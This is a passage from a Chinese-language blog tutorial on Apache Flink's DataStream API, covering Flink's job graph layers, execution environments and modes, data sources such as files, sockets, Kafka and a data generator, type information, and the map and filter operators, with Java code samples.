物理图（Physical Graph）</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646750.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202404161646751.png" alt></p><ul><li><strong>逻辑流图（StreamGraph）</strong></li></ul><p>这是根据用户通过 DataStream API编写的代码生成的最初的DAG图，用来表示程序的拓扑结构。这一步一般在客户端完成</p><ul><li><strong>作业图（JobGraph）</strong></li></ul><p>StreamGraph经过优化后生成的就是作业图（JobGraph），这是提交给 JobManager 的数据结构，确定了当前作业中所有任务的划分。主要的优化为：将多个符合条件的节点链接在一起合并成一个任务节点，形成算子链，这样可以减少数据交换的消耗。JobGraph一般也是在客户端生成的，在作业提交时传递给JobMaster。我们提交作业之后，打开Flink自带的Web UI，点击作业就能看到对应的作业图</p><ul><li><strong>执行图（ExecutionGraph）</strong></li></ul><p>JobMaster收到JobGraph后，会根据它来生成执行图（ExecutionGraph）。ExecutionGraph是JobGraph的并行化版本，是调度层最核心的数据结构。与JobGraph最大的区别就是按照并行度对并行子任务进行了拆分，并明确了任务间数据传输的方式</p><ul><li><strong>物理图（Physical Graph）</strong></li></ul><p>JobMaster生成执行图后，会将它分发给TaskManager；各个TaskManager会根据执行图部署任务，最终的物理执行过程也会形成一张“图”，一般就叫作物理图（Physical Graph）。这只是具体执行层面的图，并不是一个具体的数据结构。物理图主要就是在执行图的基础上，进一步确定数据存放的位置和收发的具体方式。有了物理图，TaskManager就可以对传递来的数据进行处理计算了</p><h3 id="3-3-Yarn应用模式作业提交流程-重点">3.3 Yarn应用模式作业提交流程(重点)</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646752.png" alt></p><h1>四、DataStream API</h1><p>DataStream API是Flink的核心层API。一个Flink程序，其实就是对DataStream的各种转换：Enviroment(获取执行环境)→Source(读取数据源)→Transformation(转换操作)→Sink(输出)</p><h2 id="1、执行环境（Execution-Environment）">1、执行环境（Execution Environment）</h2><p>Flink程序可以在各种上下文环境中运行：我们可以在本地JVM中执行程序，也可以提交到远程集群上运行。不同的环境，代码的提交运行的过程会有所不同。这就要求我们在提交作业执行计算时，首先必须获取当前Flink的运行环境，从而建立起与Flink框架之间的联系</p><h3 id="1-1-创建执行环境">1.1 创建执行环境</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接调用getExecutionEnvironment方法</span></span><br><span class="line"><span class="comment">// 根据当前运行的方式，自行决定该返回什么样的运行环境</span></span><br><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line"><span class="comment">// createLocalEnvironment</span></span><br><span class="line"><span class="comment">// 这个方法返回一个本地执行环境。可以在调用时传入一个参数，指定默认的并行度；如果不传入，则默认并行度就是本地的CPU核心数</span></span><br><span class="line">StreamExecutionEnvironment localEnv = StreamExecutionEnvironment.createLocalEnvironment();</span><br><span class="line"></span><br><span class="line"><span class="comment">// createRemoteEnvironment</span></span><br><span class="line"><span class="comment">// 这个方法返回集群执行环境。需要在调用时指定JobManager的主机名和端口号，并指定要在集群中运行的Jar包</span></span><br><span class="line">StreamExecutionEnvironment remoteEnv = StreamExecutionEnvironment</span><br><span class="line">      .createRemoteEnvironment(</span><br><span class="line">        <span class="string">"host"</span>,                   <span class="comment">// JobManager主机名</span></span><br><span class="line">        <span class="number">1234</span>,                     <span class="comment">// JobManager进程端口号</span></span><br><span class="line">         <span class="string">"path/to/jarFile.jar"</span>  <span class="comment">// 提交给JobManager的JAR包</span></span><br><span class="line">    ); </span><br><span class="line"><span class="comment">// 在获取到程序执行环境后，我们还可以对执行环境进行灵活的设置。比如可以全局设置程序的并行度、禁用算子链，还可以定义程序的时间语义、配置容错机制</span></span><br></pre></td></tr></table></figure><h3 id="1-2-执行模式（Execution-Mode）">1.2 执行模式（Execution Mode）</h3><p>从Flink 1.12开始，官方推荐的做法是直接使用DataStream API，在提交任务时通过将执行模式设为BATCH来进行批处理。不建议使用DataSet API</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 流处理环境</span></span><br><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"><span class="comment">// DataStream API执行模式包括：流执行模式、批执行模式和自动模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 流执行模式（Streaming）:这是DataStream API最经典的模式，一般用于需要持续实时处理的无界数据流。默认情况下，程序使用的就是Streaming执行模式。</span></span><br><span class="line"><span class="comment">// 批执行模式（Batch）:专门用于批处理的执行模式</span></span><br><span class="line"><span class="comment">// 自动模式（AutoMatic）:在这种模式下，将由程序根据输入数据源是否有界，来自动选择执行模式。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 批执行模式的使用。主要有两种方式：</span></span><br><span class="line"><span class="comment">// 通过命令行配置,在提交作业时，增加execution.runtime-mode参数，指定值为BATCH。</span></span><br><span class="line">bin/flink run -Dexecution.runtime-mode=BATCH ...</span><br><span class="line"><span class="comment">// 通过代码配置,在代码中，直接基于执行环境调用setRuntimeMode方法，传入BATCH模式。实际应用中一般不会在代码中配置，而是使用命令行，这样更加灵活</span></span><br><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">env.setRuntimeMode(RuntimeExecutionMode.BATCH);</span><br></pre></td></tr></table></figure><h3 id="1-3-触发程序执行">1.3 触发程序执行</h3><p>需要注意的是，写完输出（sink）操作并不代表程序已经结束。因为当main()方法被调用时，其实只是定义了作业的每个执行操作，然后添加到数据流图中；这时并没有真正处理数据——因为数据可能还没来。Flink是由事件驱动的，只有等到数据到来，才会触发真正的计算，这也被称为“延迟执行”或“懒执行”。所以我们需要显式地调用执行环境的execute()方法，来触发程序执行。execute()方法将一直等待作业完成，然后返回一个执行结果（JobExecutionResult）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env.execute();</span><br><span class="line"><span class="comment"># 上面方法是同步执行的，等待任务来，当然也有异步执行executeAsync，这个方法可以在一个main函数提交多个job，不过不推荐</span></span><br></pre></td></tr></table></figure><h2 id="2、源算子（Source）">2、源算子（Source）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Flink1.12以前，旧的添加source的方式，是调用执行环境的addSource()方法</span></span><br><span class="line">DataStream&lt;String&gt; stream = env.addSource(...);</span><br><span class="line"><span class="comment">// 方法传入的参数是一个“源函数”（source function），需要实现SourceFunction接口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从Flink1.12开始，主要使用流批统一的新Source架构</span></span><br><span class="line">DataStreamSource&lt;String&gt; stream = env.fromSource(…)</span><br></pre></td></tr></table></figure><h3 id="2-1-从集合中读取数据">2.1 从集合中读取数据</h3><p>最简单的读取数据的方式，就是在代码中直接创建一个Java集合，然后调用执行环境的fromCollection方法进行读取。这相当于将数据临时存储到内存中，形成特殊的数据结构后，作为数据源使用，一般用于测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    List&lt;Integer&gt; data = Arrays.asList(<span class="number">1</span>, <span class="number">22</span>, <span class="number">3</span>);</span><br><span class="line">    DataStreamSource&lt;Integer&gt; ds = env.fromCollection(data);</span><br><span class="line">    stream.print();</span><br><span class="line">    env.execute();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-从文件读取数据">2.2 从文件读取数据</h3><p>真正的实际应用中，自然不会直接将数据写在代码中。通常情况下，我们会从存储介质中获取数据，一个比较常见的方式就是读取日志文件。这也是批处理中最常见的读取方式。读取文件，需要添加文件连接器依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-files<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    FileSource&lt;String&gt; fileSource = FileSource.forRecordStreamFormat(<span class="keyword">new</span> TextLineInputFormat(), <span class="keyword">new</span> Path(<span class="string">"input/word.txt"</span>)).build();</span><br><span class="line">    env.fromSource(fileSource,WatermarkStrategy.noWatermarks(),<span class="string">"file"</span>).print();</span><br><span class="line">    env.execute();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>参数可以是目录，也可以是文件；还可以从HDFS目录下读取，使用路径hdfs://…；</li><li>路径可以是相对路径，也可以是绝对路径；</li><li>相对路径是从系统属性user.dir获取路径：idea下是project的根目录，standalone模式下是集群节点根目录；</li></ul><h3 id="2-3-从Socket读取数据">2.3 从Socket读取数据</h3><p>论从集合还是文件，我们读取的其实都是有界数据。在流处理的场景中，数据往往是无界的。我们之前用到的读取socket文本流，就是流处理场景。但是这种方式由于吞吐量小、稳定性较差，一般也是用于测试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;String&gt; stream = env.socketTextStream(<span class="string">"localhost"</span>, <span class="number">7777</span>);</span><br></pre></td></tr></table></figure><h3 id="2-4-从Kafka读取数据">2.4 从Kafka读取数据</h3><p>link官方提供了连接工具<code>flink-connector-kafka</code>，直接帮我们实现了一个消费者FlinkKafkaConsumer，它就是用来读取Kafka数据的SourceFunction。</p><p>所以想要以Kafka作为数据源获取数据，我们只需要引入Kafka连接器的依赖。Flink官方提供的是一个通用的Kafka连接器，它会自动跟踪最新版本的Kafka客户端。目前最新版本只支持0.10.0版本以上的Kafka。这里我们需要导入的依赖如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-kafka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceKafka</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        KafkaSource&lt;String&gt; kafkaSource = KafkaSource.&lt;String&gt;builder()</span><br><span class="line">            .setBootstrapServers(<span class="string">"hadoop102:9092"</span>)</span><br><span class="line">            .setTopics(<span class="string">"topic_1"</span>)</span><br><span class="line">            .setGroupId(<span class="string">"atguigu"</span>)</span><br><span class="line">            .setStartingOffsets(OffsetsInitializer.latest())</span><br><span class="line">            .setValueOnlyDeserializer(<span class="keyword">new</span> SimpleStringSchema()) </span><br><span class="line">            .build();</span><br><span class="line">        DataStreamSource&lt;String&gt; stream = env.fromSource(kafkaSource, WatermarkStrategy.noWatermarks(), <span class="string">"kafka-source"</span>);</span><br><span class="line">        stream.print(<span class="string">"Kafka"</span>);</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-从数据生成器读取数据">2.5 从数据生成器读取数据</h3><p>Flink从1.11开始提供了一个内置的DataGen 连接器，主要是用于生成一些随机数，用于在没有数据源的时候，进行流任务的测试以及性能测试等。1.17提供了新的Source写法，需要导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-datagen<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataGeneratorDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果有n个并行度， 最大值设为a</span></span><br><span class="line">        <span class="comment">// 将数值 均分成 n份，  a/n ,比如，最大100，并行度2，每个并行度生成50个</span></span><br><span class="line">        <span class="comment">// 其中一个是 0-49，另一个50-99</span></span><br><span class="line">        env.setParallelism(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 数据生成器Source，四个参数：</span></span><br><span class="line"><span class="comment">         *     第一个： GeneratorFunction接口，需要实现， 重写map方法， 输入类型固定是Long</span></span><br><span class="line"><span class="comment">         *     第二个： long类型， 自动生成的数字序列（从0自增）的最大值(小于)，达到这个值就停止了</span></span><br><span class="line"><span class="comment">         *     第三个： 限速策略， 比如 每秒生成几条数据</span></span><br><span class="line"><span class="comment">         *     第四个： 返回的类型</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        DataGeneratorSource&lt;String&gt; dataGeneratorSource = <span class="keyword">new</span> DataGeneratorSource&lt;&gt;(</span><br><span class="line">                <span class="keyword">new</span> GeneratorFunction&lt;Long, String&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> String <span class="title">map</span><span class="params">(Long value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">"Number:"</span> + value;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="number">100</span>,</span><br><span class="line">                RateLimiterStrategy.perSecond(<span class="number">1</span>),</span><br><span class="line">                Types.STRING</span><br><span class="line">        );</span><br><span class="line">        env</span><br><span class="line">                .fromSource(dataGeneratorSource, WatermarkStrategy.noWatermarks(), <span class="string">"data-generator"</span>)</span><br><span class="line">                .print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-6-Flink支持的数据类型">2.6 Flink支持的数据类型</h3><p><strong>Flink支持的数据类型</strong></p><p>Flink使用“类型信息”（TypeInformation）来统一表示数据类型。TypeInformation类是Flink中所有类型描述符的基类。它涵盖了类型的一些基本属性，并为每个数据类型生成特定的序列化器、反序列化器和比较器</p><p><strong>Flink支持的数据类型</strong></p><p>对于常见的Java和Scala数据类型，Flink都是支持的。Flink在内部，Flink对支持不同的类型进行了划分，这些类型可以在Types工具类中找到：</p><p>（1）基本类型</p><p>所有Java基本类型及其包装类，再加上Void、String、Date、BigDecimal和BigInteger。</p><p>（2）数组类型</p><p>包括基本类型数组（PRIMITIVE_ARRAY）和对象数组（OBJECT_ARRAY）。</p><p>（3）复合数据类型</p><ul><li>Java元组类型（TUPLE）：这是Flink内置的元组类型，是Java API的一部分。最多25个字段，也就是从Tuple0~Tuple25，不支持空字段</li><li>Scala 样例类及Scala元组：不支持空字段</li><li>行类型（ROW）：可以认为是具有任意个字段的元组，并支持空字段</li><li>POJO：Flink自定义的类似于Java bean模式的类</li></ul><p>（4）辅助类型</p><p>Option、Either、List、Map等。</p><p>（5）泛型类型（GENERIC）</p><p>Flink支持所有的Java类和Scala类。不过如果没有按照上面POJO类型的要求来定义，就会被Flink当作泛型类来处理。Flink会把泛型类型当作黑盒，无法获取它们内部的属性；它们也不是由Flink本身序列化的，而是由Kryo序列化的。</p><p>在这些类型中，元组类型和POJO类型最为灵活，因为它们支持创建复杂类型。而相比之下，POJO还支持在键（key）的定义中直接使用字段名，这会让我们的代码可读性大大增加。所以，在项目实践中，往往会将流处理程序中的元素类型定为Flink的POJO类型。Flink对POJO类型的要求如下：</p><ul><li>类是公有（public）的</li><li>有一个无参的构造方法</li><li>所有属性都是公有（public）的</li><li>所有属性的类型都是可以序列化的</li></ul><p><strong>类型提示（Type Hints）</strong></p><p>Flink还具有一个类型提取系统，可以分析函数的输入和返回类型，自动获取类型信息，从而获得对应的序列化器和反序列化器。但是，由于Java中泛型擦除的存在，在某些特殊情况下（比如Lambda表达式中），自动提取的信息是不够精细的——只告诉Flink当前的元素由“船头、船身、船尾”构成，根本无法重建出“大船”的模样；这时就需要显式地提供类型信息，才能使应用程序正常工作或提高其性能。</p><p>为了解决这类问题，Java API提供了专门的“类型提示”（type hints）。之前的word count流处理程序，我们在将String类型的每个词转换成（word， count）二元组后，就明确地用returns指定了返回的类型。因为对于map里传入的Lambda表达式，系统只能推断出返回的是Tuple2类型，而无法得到Tuple2&lt;String, Long&gt;。只有显式地告诉系统当前的返回类型，才能正确地解析出完整数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.map(word -&gt; Tuple2.of(word, <span class="number">1L</span>))</span><br><span class="line">.returns(Types.TUPLE(Types.STRING, Types.LONG));</span><br></pre></td></tr></table></figure><p>Flink还专门提供了TypeHint类，它可以捕获泛型的类型信息，并且一直记录下来，为运行时提供足够的信息。我们同样可以通过.returns()方法，明确地指定转换之后的DataStream里元素的类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">returns(<span class="keyword">new</span> TypeHint&lt;Tuple2&lt;Integer, SomeType&gt;&gt;()&#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id="3、转换算子（Transformation）">3、转换算子（Transformation）</h2><h3 id="3-1-基本转换算子（map-filter-flatMap）">3.1 基本转换算子（map/ filter/ flatMap）</h3><p><strong>映射（map）</strong></p><p>map是大家非常熟悉的大数据操作算子，主要用于将数据流中的数据进行转换，形成新的数据流。简单来说，就是一个“一一映射”，消费一个元素就产出一个元素。我们只需要基于DataStream调用map()方法就可以进行转换处理。方法需要传入的参数是接口MapFunction的实现；返回值类型还是DataStream，不过泛型（流中的元素类型）可能改变。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WaterSensor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String id;</span><br><span class="line">    <span class="keyword">public</span> Long ts;</span><br><span class="line">    <span class="keyword">public</span> Integer vc;</span><br><span class="line">    <span class="comment">// 一定要提供一个 空参 的构造器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WaterSensor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WaterSensor</span><span class="params">(String id, Long ts, Integer vc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.ts = ts;</span><br><span class="line">        <span class="keyword">this</span>.vc = vc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// getter//setter</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransMap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;WaterSensor&gt; stream = env.fromElements(</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">                <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_2"</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式一：传入匿名类，实现MapFunction</span></span><br><span class="line">        stream.map(<span class="keyword">new</span> MapFunction&lt;WaterSensor, String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">map</span><span class="params">(WaterSensor e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> e.id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).print();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式二：传入MapFunction的实现类</span></span><br><span class="line">        <span class="comment">// stream.map(new UserMap()).print();</span></span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserMap</span> <span class="keyword">implements</span> <span class="title">MapFunction</span>&lt;<span class="title">WaterSensor</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">map</span><span class="params">(WaterSensor e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>过滤（filter）</strong></p><p>filter转换操作，顾名思义是对数据流执行一个过滤，通过一个布尔条件表达式设置过滤条件，对于每一个流内元素进行判断，若为true则元素正常输出，若为false则元素被过滤掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransFilter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        DataStreamSource&lt;WaterSensor&gt; stream = env.fromElements(</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_1"</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_2"</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">      <span class="keyword">new</span> WaterSensor(<span class="string">"sensor_3"</span>, <span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 方式一：传入匿名类实现FilterFunction</span></span><br><span class="line">        stream.filter(<span class="keyword">new</span> FilterFunction&lt;WaterSensor&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(WaterSensor e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> e.id.equals(<span 